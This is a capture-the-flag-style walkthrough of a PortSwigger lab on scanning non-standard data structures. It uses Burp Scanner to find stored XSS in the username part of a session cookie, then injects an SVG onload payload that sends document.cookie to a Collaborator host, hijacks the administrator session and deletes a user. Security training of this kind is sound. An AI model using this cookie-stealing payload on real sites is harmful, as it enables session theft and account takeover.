## Scanning non-standard data structures

This lab contains a vulnerability that is difficult to find manually. It is located in a non-standard data structure.

To solve the lab, use Burp Scanner's Scan selected insertion point feature to identify the vulnerability, then manually exploit it and delete carlos.

You can log in to your own account with the following credentials: wiener:peter

## Notes

- Possibility to leave a comment on a post
- /admin
- /login

## Resume


1. Log in as `wiener` and inspect authenticated requests.
2. Identify that the session cookie contains `username:token` structure.
3. Select the username portion of the cookie and run Burp Scanner on it.
4. Detect stored XSS triggered via cookie parsing.
5. Confirm vulnerability via Collaborator interaction.
6. Send exploit to Repeater and replace the PoC with a cookie exfiltration payload.
7. Retrieve the admin session via Collaborator logs.
8. Replace your session cookie with the admin cookie.
9. Access the admin panel and delete `carlos`.


## Solve


After logging in, intercept the request:

```http
GET /my-account?id=wiener HTTP/2
Host: 0a73002e03fbb96380423504009f0011.web-security-academy.net
Cookie: session=wiener:aeRSNUz5WZfsjBYLOE9rluuj5faXzDbFc
```

You notice that the session cookie is not opaque. It is composed of two parts separated by a colon: a username (`wiener`) and a token. This suggests the application may process each part independently.

To test this, select the first part of the cookie (`wiener`) and use Burp Scanner with:

```http
Scan selected insertion point
```

After launching the scan, Burp identifies a stored XSS vulnerability. The injection point is the username portion of the session cookie, which is later reflected unsafely in the application.

The scanner confirms this by triggering an interaction with Burp Collaborator.

In the scan report, open the generated request and send it to Repeater. Then retrieve a Collaborator payload and prepare an exploit.

The goal is to exfiltrate cookies from any victim, including the administrator. Replace the vulnerable cookie value with a payload that injects JavaScript via SVG:

```http
Cookie: session='"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:aeRSNUz5WZfsjBYLOE9rluuj5faXzDbFc
```

This payload keeps the second part of the cookie intact, preserving your valid session token, while injecting malicious script into the first part.

After sending the request, wait in the Collaborator tab and poll for interactions. You should observe HTTP requests containing the victim’s cookies.

Among the captured requests, you find the administrator session cookie.

Example extracted cookie:

```http
administrator:fstDMwHqR4ijz6K8daFWdtYS6ftbq2Gv
```

Now replace your own session cookie with the stolen administrator cookie in your browser using:

```http
DevTools > Application > Cookies
```

Refresh the page while authenticated as the administrator.

You now have access to the admin panel.

Finally, navigate to the admin interface and delete:

```http
carlos
```

This solves the lab.